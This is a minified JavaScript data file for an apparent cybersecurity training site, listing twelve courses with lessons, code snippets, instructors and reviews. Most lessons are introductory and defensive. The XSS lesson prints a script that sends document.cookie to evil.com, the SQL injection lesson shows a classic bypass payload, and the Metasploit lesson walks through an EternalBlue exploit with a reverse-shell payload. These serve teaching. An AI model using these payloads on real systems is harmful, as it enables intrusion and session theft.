const c=[{id:"c1",title:"Cybersecurity Fundamentals",description:"Master the core principles of cybersecurity, threat landscapes, and security frameworks.",longDescription:"This foundational course covers the essential concepts every cybersecurity professional must know. From the CIA triad to modern threat landscapes, you will build a solid understanding of how to protect systems and data in an increasingly hostile digital world.",category:"Cybersecurity Fundamentals",difficulty:"Beginner",duration:8,lessonsCount:16,xpReward:500,instructor:"Dr. Sarah Chen",instructorBio:"Former NSA analyst with 15+ years in defensive security and threat intelligence.",instructorAvatarColor:"#00ff9d",icon:"bi-shield-check",rating:4.8,reviewsCount:1240,enrolled:5200,objectives:["Understand the CIA triad and security principles","Identify common threat actors and attack vectors","Apply security frameworks (NIST, ISO 27001)","Implement basic security controls","Evaluate risk and develop mitigation strategies"],requirements:["Basic computer literacy","No prior security experience required","Interest in cybersecurity"],modules:[{id:"c1m1",title:"Module 1 — Cybersecurity Fundamentals",lessons:[{id:"c1l1",title:"What is Cybersecurity?",duration:15,icon:"bi-shield",content:`Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These cyberattacks are usually aimed at accessing, changing, or destroying sensitive information, extorting money from users, or interrupting normal business processes.

Implementing effective cybersecurity measures is particularly challenging today because there are more devices than people, and attackers are becoming more innovative.`,codeExample:`# The CIA Triad
Confidentiality -> Integrity -> Availability

# Security is a process, not a product.`,note:"Cybersecurity is a continuous process, not a one-time setup.",tip:"Always think about security in layers — no single control is enough."},{id:"c1l2",title:"Threat Landscape",duration:20,icon:"bi-exclamation-triangle",content:`The modern threat landscape includes a wide variety of actors: nation-states, organized crime, hacktivists, insider threats, and script kiddies. Each has different motivations, capabilities, and targets.

Common attack vectors include phishing, malware, ransomware, DDoS, SQL injection, and zero-day exploits.`,codeExample:`Attack Vectors:
- Phishing (social engineering)
- Malware / Ransomware
- DDoS
- SQL Injection
- Zero-day exploits
- Supply chain attacks`,note:"Threat intelligence helps organizations understand and prepare for these threats.",tip:"Stay updated on the latest threats through sources like CVE databases and security blogs."},{id:"c1l3",title:"Security Principles",duration:18,icon:"bi-shield-lock",content:`The CIA Triad is the foundation of information security:

Confidentiality: Ensuring information is accessible only to authorized individuals.
Integrity: Maintaining accuracy and completeness of data.
Availability: Ensuring information is accessible when needed.

Additional principles include least privilege, defense in depth, and separation of duties.`,codeExample:`Principle of Least Privilege:
  user.role = "analyst"
  user.permissions = ["read", "report"]
  # NOT ["admin", "delete", "read", "report"]`,note:"Defense in depth means using multiple layers of security controls.",tip:"Apply the principle of least privilege to every account and system."},{id:"c1l4",title:"Authentication & Authorization",duration:22,icon:"bi-key",content:`Authentication verifies who you are. Authorization determines what you can do. Both are critical security controls.

Modern authentication includes passwords, biometrics, hardware tokens, and multi-factor authentication (MFA). Authorization models include RBAC (Role-Based Access Control) and ABAC (Attribute-Based Access Control).`,codeExample:`# Multi-Factor Authentication
Factor 1: Something you KNOW  (password)
Factor 2: Something you HAVE  (token)
Factor 3: Something you ARE   (biometric)`,note:"MFA can block over 99% of automated attacks.",tip:"Always enable MFA when available — it is one of the most effective security controls."}]},{id:"c1m2",title:"Module 2 — Risk & Compliance",lessons:[{id:"c1l5",title:"Risk Management",duration:20,icon:"bi-graph-up",content:`Risk management is the process of identifying, assessing, and controlling threats to an organization. The risk equation: Risk = Threat x Vulnerability x Impact.

Organizations use risk assessments to prioritize security investments and controls.`,codeExample:`Risk = Likelihood x Impact

Risk Levels:
  Low    -> Accept
  Medium -> Mitigate
  High   -> Transfer / Avoid`,tip:"You cannot eliminate all risk — focus on reducing it to an acceptable level."},{id:"c1l6",title:"Security Frameworks",duration:25,icon:"bi-diagram-3",content:`Security frameworks provide structured approaches to managing cybersecurity. Key frameworks include NIST Cybersecurity Framework, ISO 27001, CIS Controls, and MITRE ATT&CK.

These frameworks help organizations assess and improve their security posture.`,codeExample:`NIST CSF Core Functions:
1. Identify
2. Protect
3. Detect
4. Respond
5. Recover`,note:"Frameworks are guidelines, not strict rules — adapt them to your organization."},{id:"c1l7",title:"Incident Response",duration:20,icon:"bi-megaphone",content:`Incident response is a structured approach to handling security breaches. The six phases: Preparation, Identification, Containment, Eradication, Recovery, and Lessons Learned.

A good incident response plan minimizes damage and reduces recovery time.`,codeExample:`Incident Response Phases:
1. Preparation
2. Identification
3. Containment
4. Eradication
5. Recovery
6. Lessons Learned`,tip:"Practice your incident response plan with tabletop exercises before a real incident occurs."},{id:"c1l8",title:"Security Awareness",duration:15,icon:"bi-people",content:`Humans are often the weakest link in security. Security awareness training helps employees recognize and respond to threats like phishing, social engineering, and data handling mistakes.

A strong security culture is everyones responsibility.`,tip:"Regular phishing simulations are one of the most effective awareness training methods."}]}],reviews:[{id:"r1",author:"Alex M.",rating:5,comment:"Perfect introduction to cybersecurity. Clear and engaging.",date:"2025-08-15"},{id:"r2",author:"Jordan K.",rating:4,comment:"Great fundamentals course, wish it had more hands-on labs.",date:"2025-09-02"},{id:"r3",author:"Sam R.",rating:5,comment:"Loved the real-world examples. Highly recommend for beginners.",date:"2025-09-20"}]},{id:"c2",title:"Ethical Hacking Essentials",description:"Learn the methodologies and tools used by ethical hackers to find and fix vulnerabilities.",longDescription:"Ethical hacking is the authorized practice of bypassing system security to identify potential data breaches and threats. This course teaches you the mindset, methodology, and tools used by professional penetration testers.",category:"Ethical Hacking",difficulty:"Intermediate",duration:12,lessonsCount:20,xpReward:700,instructor:"Marcus Reid",instructorBio:"OSCP-certified penetration tester with 10 years of experience in red team operations.",instructorAvatarColor:"#00d4ff",icon:"bi-bug",rating:4.9,reviewsCount:980,enrolled:3400,objectives:["Understand the ethical hacking methodology","Perform reconnaissance and enumeration","Identify and exploit common vulnerabilities","Use tools like Nmap, Burp Suite, and Metasploit","Write professional penetration test reports"],requirements:["Basic networking knowledge","Familiarity with Linux command line","Understanding of basic security concepts"],modules:[{id:"c2m1",title:"Module 1 — Reconnaissance",lessons:[{id:"c2l1",title:"Introduction to Ethical Hacking",duration:18,icon:"bi-bug",content:`Ethical hacking involves the same techniques as malicious hacking, but with permission and a different goal — to improve security. The key difference is authorization and intent.

Ethical hackers follow a code of ethics and operate within legal boundaries.`,codeExample:`Ethical Hacking Phases:
1. Reconnaissance
2. Scanning
3. Gaining Access
4. Maintaining Access
5. Covering Tracks`,note:"Always obtain written authorization before testing any system.",tip:"Document everything — a penetration test is only as good as its report."},{id:"c2l2",title:"Passive Reconnaissance",duration:22,icon:"bi-search",content:`Passive reconnaissance collects information without directly interacting with the target. Techniques include OSINT gathering, DNS lookups, search engine queries, and social media analysis.

Tools include Google, Shodan, WHOIS, and theHarvester.`,codeExample:`# OSINT Gathering
whois example.com
dig example.com any
# Google dork: site:example.com filetype:pdf`,tip:"Google dorking can reveal sensitive information indexed by search engines."},{id:"c2l3",title:"Active Reconnaissance",duration:20,icon:"bi-radar",content:`Active reconnaissance involves directly interacting with the target system. This includes port scanning, service enumeration, and vulnerability scanning.

Nmap is the industry standard for network scanning.`,codeExample:`# Nmap Scan Examples
nmap -sS -sV -O target.com      # Stealth SYN scan
nmap -sU target.com             # UDP scan
nmap --script vuln target.com   # Vulnerability scan`,note:"Active reconnaissance is noisier and more likely to be detected.",tip:"Use timing options (-T0 to -T5) to control scan speed and stealth."}]},{id:"c2m2",title:"Module 2 — Scanning & Enumeration",lessons:[{id:"c2l4",title:"Port Scanning",duration:25,icon:"bi-hdd-network",content:`Port scanning identifies open ports and services running on a target. Common scan types include TCP SYN, TCP Connect, UDP, and FIN scans.

Each open port is a potential entry point.`,codeExample:`# TCP vs UDP Scanning
TCP: Connection-oriented, reliable
UDP: Connectionless, faster but less reliable

# Common Ports
22  -> SSH
80  -> HTTP
443 -> HTTPS
3306-> MySQL`,tip:"Scan all 65535 ports, not just the top 1000 — services can run anywhere."},{id:"c2l5",title:"Service Enumeration",duration:22,icon:"bi-list-task",content:"Enumeration extracts detailed information about services: versions, configurations, users, and shares. This information is critical for finding exploitable vulnerabilities.",codeExample:`# SMB Enumeration
smbclient -L //target
enum4linux -a target

# HTTP Enumeration
whatweb http://target
nikto -h http://target`,tip:"Service versions often map directly to known CVEs — always enumerate versions."}]}],reviews:[{id:"r4",author:"Taylor B.",rating:5,comment:"Excellent hands-on approach to ethical hacking.",date:"2025-07-30"},{id:"r5",author:"Casey L.",rating:4,comment:"Great content, would love more advanced exploitation modules.",date:"2025-09-10"}]},{id:"c3",title:"Network Security Mastery",description:"Secure networks against attacks: firewalls, IDS/IPS, VPNs, and network segmentation.",longDescription:"Network security protects the integrity, confidentiality, and availability of data as it travels across networks. This course covers firewalls, intrusion detection systems, VPNs, and network architecture best practices.",category:"Network Security",difficulty:"Intermediate",duration:10,lessonsCount:18,xpReward:600,instructor:"Priya Sharma",instructorBio:"Network security architect with expertise in enterprise defense and zero-trust models.",instructorAvatarColor:"#00ff9d",icon:"bi-hdd-network",rating:4.7,reviewsCount:760,enrolled:2800,objectives:["Design secure network architectures","Configure firewalls and IDS/IPS","Implement VPNs and secure tunnels","Apply network segmentation and zero trust","Monitor and analyze network traffic"],requirements:["Understanding of TCP/IP","Basic networking knowledge","Familiarity with Linux"],modules:[{id:"c3m1",title:"Module 1 — Network Defense",lessons:[{id:"c3l1",title:"Firewall Fundamentals",duration:20,icon:"bi-shield",content:`Firewalls filter network traffic based on rules. Types include packet-filtering, stateful inspection, proxy, and next-generation firewalls (NGFW).

Firewalls are the first line of network defense.`,codeExample:`# iptables Rules
iptables -A INPUT -p tcp --dport 22 -j ACCEPT   # Allow SSH
iptables -A INPUT -p tcp --dport 80 -j ACCEPT   # Allow HTTP
iptables -A INPUT -j DROP                       # Drop all else`,tip:"Default-deny is the safest firewall policy — allow only what is needed."},{id:"c3l2",title:"IDS and IPS",duration:22,icon:"bi-eye",content:"Intrusion Detection Systems (IDS) detect suspicious activity. Intrusion Prevention Systems (IPS) can also block it. Snort and Suricata are popular open-source options.",codeExample:`# Snort Alert Example
alert tcp any any -> $HOME_NET 22 (msg:"SSH scan"; threshold: type both, track by_src, count 5, seconds 60;)`,note:"IDS is detective; IPS is preventive. Many modern tools do both."},{id:"c3l3",title:"VPNs and Secure Tunnels",duration:20,icon:"bi-lock",content:`Virtual Private Networks (VPNs) create encrypted tunnels over public networks. Protocols include IPsec, OpenVPN, and WireGuard.

VPNs ensure confidentiality and integrity of data in transit.`,codeExample:`# VPN Protocols
IPsec:   Enterprise standard, complex
OpenVPN: Open source, widely used
WireGuard: Modern, fast, simple`,tip:"WireGuard is the modern VPN choice — simpler and faster than OpenVPN."}]}],reviews:[{id:"r6",author:"Morgan D.",rating:5,comment:"Comprehensive network security guide. Very practical.",date:"2025-08-22"},{id:"r7",author:"Riley P.",rating:4,comment:"Good coverage of firewalls and IDS/IPS.",date:"2025-09-05"}]},{id:"c4",title:"Web Application Security",description:"Defend web apps against OWASP Top 10 vulnerabilities and modern web attacks.",longDescription:"Web applications are a primary target for attackers. This course covers the OWASP Top 10, common web vulnerabilities, secure coding practices, and testing methodologies to build and maintain secure web applications.",category:"Web Security",difficulty:"Intermediate",duration:14,lessonsCount:22,xpReward:750,instructor:"James Park",instructorBio:"Web security researcher and bug bounty hunter with 50+ CVEs to his name.",instructorAvatarColor:"#00d4ff",icon:"bi-globe",rating:4.9,reviewsCount:1500,enrolled:4100,objectives:["Understand the OWASP Top 10 vulnerabilities","Identify and prevent SQL injection","Defend against XSS and CSRF attacks","Implement secure authentication and session management","Use security testing tools effectively"],requirements:["Basic HTML/JavaScript knowledge","Understanding of HTTP protocol","Familiarity with web applications"],modules:[{id:"c4m1",title:"Module 1 — OWASP Top 10",lessons:[{id:"c4l1",title:"Introduction to Web Security",duration:18,icon:"bi-globe",content:`Web application security protects web apps from security threats. The OWASP Top 10 lists the most critical web application security risks.

Understanding these vulnerabilities is essential for developers and security professionals.`,codeExample:`# OWASP Top 10 (2021)
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Auth Failures
8. Software/Data Integrity Failures
9. Logging/Monitoring Failures
10. SSRF`,tip:"The OWASP Top 10 is a starting point, not a complete checklist."},{id:"c4l2",title:"SQL Injection",duration:25,icon:"bi-database",content:`SQL injection occurs when untrusted input is inserted into SQL queries without proper sanitization. Attackers can read, modify, or delete data, and sometimes execute commands.

Prevention: parameterized queries, stored procedures, and input validation.`,codeExample:`# Vulnerable code
query = "SELECT * FROM users WHERE name='" + input + "'"
# Attack: input = ' OR '1'='1
# Result: SELECT * FROM users WHERE name='' OR '1'='1

# Safe code (parameterized)
query = "SELECT * FROM users WHERE name=?"
cursor.execute(query, (input,))`,note:"SQL injection can lead to complete database compromise.",tip:"Always use parameterized queries — never concatenate user input into SQL."},{id:"c4l3",title:"Cross-Site Scripting (XSS)",duration:25,icon:"bi-code-slash",content:`XSS injects malicious scripts into web pages viewed by other users. Types: Stored, Reflected, and DOM-based.

Prevention: output encoding, CSP headers, and input validation.`,codeExample:`# XSS Attack
<script>document.location='http://evil.com/steal?c='+document.cookie<\/script>

# Prevention
- Encode output: &lt;script&gt;
- Content-Security-Policy header
- HttpOnly cookies`,tip:"Content-Security-Policy is one of the most effective XSS defenses."},{id:"c4l4",title:"CSRF and Session Security",duration:20,icon:"bi-arrow-repeat",content:`Cross-Site Request Forgery (CSRF) tricks users into executing unwanted actions on a web app where they are authenticated.

Prevention: anti-CSRF tokens, SameSite cookies, and requiring re-authentication for sensitive actions.`,codeExample:`# CSRF Prevention
- Anti-CSRF tokens
- SameSite=Strict cookies
- Verify Origin header
- Require re-auth for sensitive actions`,note:"SameSite cookies provide a first line of defense against CSRF."}]}],reviews:[{id:"r8",author:"Drew A.",rating:5,comment:"Best web security course I have taken. Very thorough.",date:"2025-08-18"},{id:"r9",author:"Quinn F.",rating:5,comment:"The SQL injection and XSS modules are excellent.",date:"2025-09-12"}]},{id:"c5",title:"Cryptography Deep Dive",description:"From ancient ciphers to modern encryption: symmetric, asymmetric, hashing, and PKI.",longDescription:"Cryptography is the foundation of digital security. This course covers encryption algorithms, hash functions, digital signatures, public key infrastructure, and cryptographic protocols used in modern systems.",category:"Cryptography",difficulty:"Advanced",duration:11,lessonsCount:16,xpReward:650,instructor:"Dr. Alan Volkov",instructorBio:"Cryptographer and professor with expertise in post-quantum cryptography.",instructorAvatarColor:"#00ff9d",icon:"bi-key",rating:4.6,reviewsCount:520,enrolled:1900,objectives:["Understand symmetric and asymmetric encryption","Apply hash functions and digital signatures","Implement PKI and certificate management","Evaluate cryptographic protocols","Understand post-quantum cryptography"],requirements:["Basic math knowledge","Programming fundamentals","Security fundamentals recommended"],modules:[{id:"c5m1",title:"Module 1 — Encryption",lessons:[{id:"c5l1",title:"Symmetric Encryption",duration:22,icon:"bi-lock",content:`Symmetric encryption uses the same key for encryption and decryption. Algorithms include AES, DES (deprecated), and ChaCha20.

AES-256 is the current standard for symmetric encryption.`,codeExample:`# AES-256-GCM
key = generate_key(256)  # 256-bit key
ciphertext = AES_GCM.encrypt(key, plaintext, nonce)
plaintext = AES_GCM.decrypt(key, ciphertext, nonce)`,tip:"Never reuse a nonce with the same key in AES-GCM — it breaks security."},{id:"c5l2",title:"Asymmetric Encryption",duration:25,icon:"bi-key",content:`Asymmetric encryption uses key pairs: a public key for encryption and a private key for decryption. Algorithms include RSA, ECC, and Diffie-Hellman.

RSA-2048 or ECC-256 are recommended for modern systems.`,codeExample:`# RSA Key Exchange
public_key = RSA.generate(2048)
ciphertext = RSA.encrypt(public_key, message)
message = RSA.decrypt(private_key, ciphertext)`,note:"Asymmetric encryption is slower than symmetric — used for key exchange, not bulk data."},{id:"c5l3",title:"Hash Functions",duration:20,icon:"bi-fingerprint",content:`Hash functions produce fixed-size outputs from arbitrary inputs. Properties: one-way, deterministic, collision-resistant.

SHA-256 and SHA-3 are recommended. MD5 and SHA-1 are broken.`,codeExample:`# Hash Comparison
MD5    -> BROKEN (collisions found)
SHA-1  -> BROKEN (collisions found)
SHA-256-> SECURE
SHA-3  -> SECURE
BLAKE3 -> SECURE & FAST`,tip:"Use salt with password hashing to prevent rainbow table attacks."}]}],reviews:[{id:"r10",author:"Sage W.",rating:5,comment:"Deep and thorough. The math is well explained.",date:"2025-08-25"}]},{id:"c6",title:"Cloud Security Essentials",description:"Secure cloud infrastructure on AWS, Azure, and GCP with best practices and compliance.",longDescription:"Cloud security protects data, applications, and infrastructure in cloud environments. This course covers shared responsibility, IAM, data protection, network security, and compliance in AWS, Azure, and GCP.",category:"Cloud Security",difficulty:"Intermediate",duration:9,lessonsCount:14,xpReward:600,instructor:"Elena Torres",instructorBio:"Cloud security architect certified in AWS, Azure, and GCP security.",instructorAvatarColor:"#00d4ff",icon:"bi-cloud",rating:4.7,reviewsCount:680,enrolled:2200,objectives:["Understand the shared responsibility model","Implement cloud IAM and access controls","Secure cloud storage and databases","Configure cloud network security","Meet compliance requirements in the cloud"],requirements:["Basic networking knowledge","Familiarity with cloud platforms","Security fundamentals recommended"],modules:[{id:"c6m1",title:"Module 1 — Cloud Foundations",lessons:[{id:"c6l1",title:"Shared Responsibility Model",duration:18,icon:"bi-cloud",content:`In the cloud, security is shared between the provider and the customer. The provider secures the infrastructure; the customer secures their data, applications, and configurations.

Understanding this boundary is critical.`,codeExample:`# Shared Responsibility
Provider: Physical, Network, Host, Hypervisor
Customer: OS, Apps, Data, IAM, Config`,tip:"Misconfiguration is the #1 cloud security risk — know your responsibilities."},{id:"c6l2",title:"Cloud IAM",duration:22,icon:"bi-person-badge",content:"Identity and Access Management (IAM) controls who can access what in the cloud. Best practices: least privilege, MFA, role-based access, and regular access reviews.",codeExample:`# IAM Best Practices
- Root account: locked, no API keys
- MFA for all users
- Roles over long-lived keys
- Least privilege policies
- Regular access reviews`,note:"Over-privileged accounts are the most common cloud security mistake."}]}],reviews:[{id:"r11",author:"Reese C.",rating:4,comment:"Good overview of cloud security across providers.",date:"2025-09-01"}]},{id:"c7",title:"Digital Forensics Fundamentals",description:"Investigate cybercrime: evidence collection, chain of custody, and forensic analysis.",longDescription:"Digital forensics is the science of investigating cyber incidents. This course covers evidence collection, preservation, analysis, and reporting using industry-standard forensic techniques and tools.",category:"Digital Forensics",difficulty:"Advanced",duration:13,lessonsCount:18,xpReward:700,instructor:"Dr. Sarah Chen",instructorBio:"Former NSA analyst with 15+ years in defensive security and threat intelligence.",instructorAvatarColor:"#00ff9d",icon:"bi-search",rating:4.8,reviewsCount:450,enrolled:1600,objectives:["Understand forensic methodology and chain of custody","Collect and preserve digital evidence","Analyze disk images and memory dumps","Investigate network traffic artifacts","Produce professional forensic reports"],requirements:["Basic security knowledge","Familiarity with Linux","Attention to detail"],modules:[{id:"c7m1",title:"Module 1 — Forensic Methodology",lessons:[{id:"c7l1",title:"Forensic Investigation Process",duration:20,icon:"bi-search",content:`Digital forensics follows a structured process: Identification, Preservation, Collection, Examination, Analysis, and Reporting.

Chain of custody is critical — every transfer of evidence must be documented.`,codeExample:`Forensic Process:
1. Identification
2. Preservation (hash + image)
3. Collection
4. Examination
5. Analysis
6. Reporting`,tip:"Always work on a copy, never the original evidence — preserve the original."},{id:"c7l2",title:"Evidence Collection",duration:22,icon:"bi-file-earmark-lock",content:`Evidence collection must be forensically sound. Use write blockers, create bit-for-bit images, and verify integrity with hashes.

Tools: dd, dc3dd, FTK Imager, Autopsy.`,codeExample:`# Create disk image with dd
dc3dd if=/dev/sda of=disk.img hash=sha256 log=hash.log

# Verify integrity
sha256sum disk.img`,note:"A single unverified step can invalidate an entire investigation."}]}],reviews:[{id:"r12",author:"Avery N.",rating:5,comment:"Fascinating course. The methodology is very well taught.",date:"2025-08-28"}]},{id:"c8",title:"Malware Analysis Techniques",description:"Reverse engineer malware: static and dynamic analysis, sandboxing, and behavioral detection.",longDescription:"Malware analysis is the study of malicious software to understand its behavior, origin, and impact. This course covers static analysis, dynamic analysis, reverse engineering, and malware classification.",category:"Malware Analysis",difficulty:"Expert",duration:15,lessonsCount:20,xpReward:800,instructor:"Marcus Reid",instructorBio:"OSCP-certified penetration tester with 10 years of experience in red team operations.",instructorAvatarColor:"#00d4ff",icon:"bi-bug",rating:4.9,reviewsCount:380,enrolled:1200,objectives:["Perform static malware analysis","Conduct dynamic analysis in a sandbox","Reverse engineer malware samples","Identify malware families and behaviors","Develop detection signatures"],requirements:["Assembly language basics","Reverse engineering fundamentals","Advanced security knowledge"],modules:[{id:"c8m1",title:"Module 1 — Malware Analysis",lessons:[{id:"c8l1",title:"Static Analysis",duration:25,icon:"bi-bug",content:`Static analysis examines malware without executing it. Techniques include file hashing, string extraction, header analysis, and disassembly.

Tools: PE Studio, strings, IDA Pro, Ghidra.`,codeExample:`# Static Analysis
strings malware.exe | grep -i "http"
pefile malware.exe  # PE header analysis
# Look for: imports, exports, sections, entropy`,tip:"High entropy sections often indicate packed or encrypted malware."},{id:"c8l2",title:"Dynamic Analysis",duration:25,icon:"bi-play-circle",content:`Dynamic analysis runs malware in a controlled sandbox to observe its behavior: network connections, file changes, registry modifications, and process creation.

Tools: Cuckoo Sandbox, Process Monitor, Wireshark.`,codeExample:`# Dynamic Analysis Setup
1. Isolated VM (no network access to production)
2. Monitoring tools installed
3. Execute sample
4. Capture: network, filesystem, registry, processes
5. Analyze behavior`,note:"Always analyze malware in an isolated environment — never on a production machine."}]}],reviews:[{id:"r13",author:"Blake S.",rating:5,comment:"Incredible depth. The reverse engineering sections are gold.",date:"2025-09-15"}]},{id:"c9",title:"Security Operations Center (SOC)",description:"Monitor, detect, and respond to security incidents in a SOC environment.",longDescription:"A Security Operations Center is the front line of defense. This course covers SIEM, log analysis, threat hunting, alert triage, and incident escalation for SOC analysts.",category:"Cybersecurity Fundamentals",difficulty:"Intermediate",duration:10,lessonsCount:16,xpReward:600,instructor:"Priya Sharma",instructorBio:"Network security architect with expertise in enterprise defense and zero-trust models.",instructorAvatarColor:"#00ff9d",icon:"bi-eye",rating:4.7,reviewsCount:590,enrolled:2e3,objectives:["Understand SOC operations and roles","Use SIEM platforms for log analysis","Perform threat hunting","Triage and escalate security alerts","Write incident response playbooks"],requirements:["Basic security knowledge","Networking fundamentals","Log analysis basics helpful"],modules:[{id:"c9m1",title:"Module 1 — SOC Operations",lessons:[{id:"c9l1",title:"SOC Fundamentals",duration:18,icon:"bi-eye",content:`A Security Operations Center monitors and defends an organization. SOC tiers: Tier 1 (triage), Tier 2 (investigation), Tier 3 (threat hunting and advanced analysis).

Key tools: SIEM, EDR, threat intelligence platforms.`,codeExample:`SOC Tiers:
Tier 1: Alert triage, initial analysis
Tier 2: Deep investigation, containment
Tier 3: Threat hunting, advanced forensics`,tip:"Reducing alert fatigue is key to an effective SOC — tune your alerts."}]}],reviews:[{id:"r14",author:"Hayden M.",rating:4,comment:"Great intro to SOC operations and SIEM.",date:"2025-09-08"}]},{id:"c10",title:"Penetration Testing with Metasploit",description:"Master the Metasploit Framework for exploitation and post-exploitation.",longDescription:"Metasploit is the most widely used penetration testing framework. This course covers exploitation, payloads, post-exploitation, and reporting using Metasploit Framework.",category:"Ethical Hacking",difficulty:"Advanced",duration:12,lessonsCount:18,xpReward:750,instructor:"Marcus Reid",instructorBio:"OSCP-certified penetration tester with 10 years of experience in red team operations.",instructorAvatarColor:"#00d4ff",icon:"bi-lightning",rating:4.8,reviewsCount:720,enrolled:2500,objectives:["Navigate the Metasploit Framework","Exploit known vulnerabilities","Generate and customize payloads","Perform post-exploitation activities","Document penetration test findings"],requirements:["Ethical hacking fundamentals","Linux command line","Networking knowledge"],modules:[{id:"c10m1",title:"Module 1 — Metasploit Basics",lessons:[{id:"c10l1",title:"Metasploit Framework Overview",duration:20,icon:"bi-lightning",content:`Metasploit is a penetration testing framework with exploits, payloads, auxiliaries, and post-exploitation modules.

Key commands: search, use, set, exploit.`,codeExample:`# Metasploit Basic Workflow
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.0.0.5
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > exploit`,tip:"Always verify you have authorization before using Metasploit against any target."}]}],reviews:[{id:"r15",author:"Parker T.",rating:5,comment:"Metasploit made simple. Great practical examples.",date:"2025-08-20"}]},{id:"c11",title:"Secure Software Development",description:"Build security into every phase of the SDLC with DevSecOps practices.",longDescription:"Secure software development integrates security into every phase of the software development lifecycle. This course covers threat modeling, secure coding, SAST/DAST, and DevSecOps practices.",category:"Web Security",difficulty:"Intermediate",duration:11,lessonsCount:16,xpReward:650,instructor:"James Park",instructorBio:"Web security researcher and bug bounty hunter with 50+ CVEs to his name.",instructorAvatarColor:"#00ff9d",icon:"bi-code-square",rating:4.6,reviewsCount:410,enrolled:1500,objectives:["Apply threat modeling to software design","Write secure code in multiple languages","Integrate SAST and DAST into CI/CD","Implement DevSecOps practices","Conduct secure code reviews"],requirements:["Programming experience","Software development knowledge","Basic security understanding"],modules:[{id:"c11m1",title:"Module 1 — DevSecOps",lessons:[{id:"c11l1",title:"Threat Modeling",duration:22,icon:"bi-diagram-3",content:`Threat modeling identifies potential threats early in design. Methods include STRIDE, PASTA, and Attack Trees.

Threat modeling shifts security left — finding issues before code is written.`,codeExample:`# STRIDE Threats
S - Spoofing
T - Tampering
R - Repudiation
I - Information Disclosure
D - Denial of Service
E - Elevation of Privilege`,tip:"Threat modeling is most effective when done during the design phase."}]}],reviews:[{id:"r16",author:"Skyler R.",rating:4,comment:"Good DevSecOps practices and tooling coverage.",date:"2025-09-03"}]},{id:"c12",title:"OSINT for Security Professionals",description:"Gather intelligence from open sources for investigations and threat assessment.",longDescription:"Open Source Intelligence (OSINT) collects and analyzes publicly available information for security purposes. This course covers OSINT tools, techniques, and ethics for investigations.",category:"Digital Forensics",difficulty:"Beginner",duration:7,lessonsCount:12,xpReward:450,instructor:"Elena Torres",instructorBio:"Cloud security architect certified in AWS, Azure, and GCP security.",instructorAvatarColor:"#00d4ff",icon:"bi-search",rating:4.5,reviewsCount:330,enrolled:1100,objectives:["Understand OSINT methodology and ethics","Use OSINT tools and techniques","Gather intelligence from social media","Analyze metadata and digital footprints","Produce OSINT reports"],requirements:["Basic internet research skills","No prior security experience needed"],modules:[{id:"c12m1",title:"Module 1 — OSINT Basics",lessons:[{id:"c12l1",title:"Introduction to OSINT",duration:15,icon:"bi-search",content:`Open Source Intelligence (OSINT) is the collection and analysis of publicly available information. It is used in investigations, threat intelligence, and due diligence.

Key principle: only use publicly available, legally accessible information.`,codeExample:`# OSINT Sources
- Search engines (Google dorking)
- Social media
- Public records
- Domain registrations (WHOIS)
- Job postings
- Breach databases`,tip:"Google dorking is a powerful OSINT technique — learn advanced search operators."}]}],reviews:[{id:"r17",author:"Rowan K.",rating:4,comment:"Great introduction to OSINT tools and techniques.",date:"2025-09-18"}]}];function l(e){return c.find(t=>t.id===e)}function d(e,t){const i=l(e);if(!i)return 0;const n=i.lessonsCount,o=i.modules.reduce((r,a)=>r+a.lessons.filter(s=>t.includes(s.id)).length,0);return n===0?0:Math.round(o/n*100)}export{l as a,c,d as g};
